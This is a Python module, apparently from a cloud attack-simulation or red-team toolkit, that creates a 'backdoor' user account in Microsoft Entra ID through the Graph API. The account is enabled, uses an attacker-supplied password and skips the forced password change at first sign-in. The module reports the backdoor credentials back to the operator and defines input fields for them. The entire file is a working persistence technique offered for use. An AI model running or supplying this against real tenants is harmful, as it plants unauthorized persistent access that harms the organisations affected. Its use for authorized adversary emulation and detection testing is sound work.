'''
Module Name: Create_Backdoor_Account
Module Description: Create a new user account in Entra ID
'''
from core.GraphFunctions import graph_post_request, graph_base_url

def TechniqueMain(display_name, user_principal_name, password):
    
    # input validation
    if display_name in [None, ""]:
        return False, {"Error" : "Invalid Technique Input"}, None
    if user_principal_name in [None, ""]:
        return False, {"Error" : "Invalid Technique Input"}, None
    if password in [None, ""]:
        return False, {"Error" : "Invalid Technique Input"}, None

    endpoint_url = graph_base_url+'users'

    # generate user details
    mail_nickname = display_name.replace(" ","")

    # create request payload
    data = {"accountEnabled": 'true',"displayName": display_name,"mailNickname": mail_nickname,"userPrincipalName": user_principal_name,"passwordProfile" : {"forceChangePasswordNextSignIn": 'false',"password": password}}
    
    try:
        raw_response = graph_post_request(url = endpoint_url, data = data)

        # create account operation successfull
        if 200 <= raw_response.status_code < 300:
            # parse raw response => pretty response
            try:
                # create pretty response
                pretty_response = {}

                pretty_response["Success"] = {
                    'Message' : "Backdoor user account created",
                    'Backdoor UPN' : user_principal_name,
                    'Password' : password,
                    'Display Name' : display_name,
                    'Enabled' : True
                }
                return True, raw_response, pretty_response
            except:
                # return only raw response if pretty response fails
                return True, raw_response, None
        
        # create account operation failed
        else:
            return False, {"Error" : {"Response Status" : raw_response.status_code, "Code" : raw_response.json().get('error').get('code', 'N/A'), "Message" : raw_response.json().get('error').get('message', 'N/A')}}, None
    
    except Exception as e:
        return False, {"Error" : e}, None

def TechniqueInputSrc() -> list:
    '''Returns the input fields required as parameters for the technique execution'''

    return [
        {"title" : "Backdoor Display Name", "id" : "backdoor-config-display-name-text-input", "type" : "text", "placeholder" : "something strong & long", "element_type" : "dcc.Input"}, 
        {"title" : "Backdoor Username", "id" : "backdoor-config-username-text-input", "type" : "text", "placeholder" : "something strong & long", "element_type" : "dcc.Input"}, 
        {"title" : "Backdoor Password", "id" : "backdoor-config-password-text-input", "type" : "text", "placeholder" : "something strong & long", "element_type" : "dcc.Input"}
        ]